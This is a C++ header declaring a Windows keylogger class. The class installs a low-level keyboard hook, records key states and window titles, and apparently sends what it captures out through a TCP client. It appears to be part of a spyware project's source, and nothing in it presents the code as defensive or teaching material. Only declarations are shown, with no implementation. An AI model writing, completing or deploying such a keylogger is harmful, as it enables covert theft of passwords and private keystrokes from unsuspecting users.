#pragma once

#include <Windows.h>
#include <tchar.h>
#include <string>
#include <vector>
#include "TcpClient.h"
#include "Filters.h"

#ifndef UNICODE
#define UNICODE
#endif // !UNICODE

class Keylogger
{
public:
	BOOLEAN SetHook();
	Keylogger(TcpClient *client, Filters *filters);
	~Keylogger();

private:
	static Filters *filters;
	static TcpClient* client;
	static HHOOK hHook;
	static LRESULT CALLBACK KeyboardProc(IN int code, IN WPARAM wParam, IN LPARAM lParam);
	static const std::vector<BYTE> valueKeys;
	static const std::vector<BYTE> specialKeys;
	static const std::vector<std::vector<BYTE>> keySets;
	static const std::vector<std::wstring> specialKeyNames;
	static BYTE keyState[256];
	static std::wstring previousWindowTitle;
};

